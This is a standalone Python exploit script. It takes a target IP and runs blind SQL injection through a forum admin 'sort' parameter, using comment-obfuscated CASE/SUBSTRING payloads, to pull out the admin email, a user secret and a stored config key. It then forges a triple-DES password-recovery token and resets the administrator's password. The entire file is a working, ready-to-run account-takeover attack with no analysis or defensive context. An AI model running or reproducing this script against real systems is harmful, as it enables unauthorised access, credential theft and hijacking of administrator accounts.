import sys
import re
import requests
import random
import base64
import pyDes

def find_chars(ip, inj_str):
    # iterate through all ascii characters
    for j in range(32, 126):
        target = "http://{}/forums/admin?sort={}".format(ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        if r.text.find("<blockquote>") != -1:
            return j
    return False

def inj(ip, injection_string):
    gathered_string = ""
    for i in range(1,50):
        curr_inj = injection_string.replace("[NUM]", str(i))
        result = find_chars(ip, curr_inj)
        if result:
            gathered_string += chr(result)
        else:
            break
    return gathered_string

def gen_recovery_token(ip, email):
    gen = requests.post("http://{}/forgotPassword".format(ip), data={
        "forgot_email" : email,
        "login_human" : "on"
        })
    if gen.url.find("interim") != -1:
        return True
    return False

def make_ord(str1):
    a = []
    for s in str1:
            a.append(ord(s))
    return a

def recovery_token(email, secret, encryption_key):
    token_content = "{}|1|{}|{}".format(email, secret, random.random())
    k = pyDes.triple_des(make_ord(encryption_key), pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)
    d = k.encrypt(token_content.encode("utf-8"))
    return base64.b64encode(d).decode("utf-8")

def reset_password(ip, token, newpass):
    gen = requests.post("http://{}/resetPassword".format(ip), data={
        "new_password_1" : newpass,
        "new_password_2" : newpass,
        "token" : token,
        "login_human" : "on"
        })
    if gen.url.find("interim") != -1:
        return True
    return False

def main(ip):
    new_pass = "newpassword123"
    print("Attacking Host: " + ip)
    get_email = "1/**/limit/**/(CASE/**/WHEN(SELECT/**/ASCII(SUBSTRING(email,[NUM],1))/**/FROM/**/users/**/where/**/id=1)=[CHAR]/**/THEN/**/1/**/ELSE/**/0/**/END)--"
    email = inj(ip, get_email)
    print("[+] Extracted Admin Email: " + email)
    if gen_recovery_token(ip, email):
        print("[+] Reset Recovery Token")
    else:
        print("[-] Failed to Reset Recovery Token")
    get_user_secret = "1/**/limit/**/(CASE/**/WHEN(SELECT/**/ASCII(SUBSTRING(secret,[NUM],1))/**/FROM/**/users/**/where/**/id=1)=[CHAR]/**/THEN/**/1/**/ELSE/**/0/**/END)--"
    user_secret = inj(ip, get_user_secret)
    print("[+] Extracted User Secret: " + user_secret)
    get_kv_secret = "1/**/limit/**/(CASE/**/WHEN(SELECT/**/ASCII(SUBSTRING(value,[NUM],1))/**/FROM/**/config_kv/**/where/**/key=$$secret$$)=[CHAR]/**/THEN/**/1/**/ELSE/**/0/**/END)--"
    kv_Config = inj(ip, get_kv_secret)
    print("[+] Extracted KV Config Secret: " + kv_Config)
    token = recovery_token(email, user_secret, kv_Config)
    print(token)
    if reset_password(ip, token, new_pass):
        print("[+] Reset Admin pasword to: " + new_pass)
    else:
        print("[-] Failed to reset admin password")

if __name__ == "__main__":
    main(sys.argv[1])
